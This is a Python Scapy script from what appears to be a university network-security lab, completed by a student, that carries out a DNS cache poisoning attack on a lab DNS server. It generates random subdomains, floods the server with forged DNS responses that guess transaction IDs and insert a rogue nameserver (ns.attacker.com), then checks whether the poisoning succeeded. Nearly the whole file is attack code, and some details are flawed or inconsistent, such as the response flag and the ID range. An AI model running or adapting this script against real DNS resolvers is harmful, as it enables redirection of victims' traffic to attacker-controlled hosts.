#! usr/bin/python3
#FIT3031 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.10.10.198"     #complete attacker's IP

#IP of our victim's dns server
target_dns_ip =  "10.10.5.53"  #complete DNS server's IP

#DNS Forwarder if local couldnt resolve 
#or real DNS of the example.com
forwarder_dns = "8.8.8.8" 

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM

# each dummy host should concat random substrings in dummy_domain_prefix and base_domain

#Your code goes here to generate 10000 dummy hostnames

dummy_domain_lst = []
for i in range (0, ATTEMPT_NUM):
	# selects a random character from the dummy_domain_prefix 5 times and join the results into a single string, then assigned it to the variable random_str
	random_str = ''.join(random.choice(dummy_domain_prefix) for j in range(5))
	dummy_domain_lst.append(random_str + base_domain)
print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0,ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS
    # Set the destination to the target DNS server IP.
    IPpkt = IP(dst=target_dns_ip)
    # Random source port and destination port as 53.
    UDPpkt = UDP(sport=random.randint(100, 60000), dport=53)
    # DNS query for the domain with ID set to loop variable i.
    DNSpkt = DNS(id=99, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=DNSQR(qname=cur_domain, qtype=1,qclass=1), an=0, ns=0, ar=0)
    # Combine the IP, UDP, and DNS packets to form the complete DNS query packet
    
    query_pkt = IPpkt/UDPpkt/DNSpkt
    # The verbose parameter set to 0 ensures no additional output is shown during sending
    send(query_pkt,verbose=0)

    ###### Step 3 : For that DNS query, generate 100 random guesses with random transactionID 
    # to spoof the response packet

    for i in range(100):
        # Generate a random transaction ID between 0 and 10000.
        tran_id = random.randint(0, 1000)
        
        NSsec1 = DNSRR(rrname='test.com', type='NS', ttl=259200, rdata='ns.attacker.com')
        
        # Spoofed IP packet. 
        IPpkt = IP(dst=target_dns_ip)
        # UDP packet with source port as 53 and a random destination port.
        UDPpkt = UDP(dport=53, sport=random.randint(1025,65000))
        # Spoofed DNS response. 
        DNSpkt = DNS(id=tran_id, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=DNSQR(qname=cur_domain, qtype=1, qclass=1),an=0,ar=0,ns=NSsec1)
		
	# Combine the packets to form the spoofed response.
        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt,verbose=0)

    ####### Step 4 : Verify the result by sending a DNS query to the server 
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000),dport =53)
    DNSpkt = DNS(id=99,rd=1,qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt,timeout=2,retry=0,verbose=0)
    try:
        if(z[DNS].an.rdata == attacker_ip):
                print("Poisonned the victim DNS server successfully.")
                break
    except:
             print("Poisonning failed")

#### END ATTACK SIMULATION
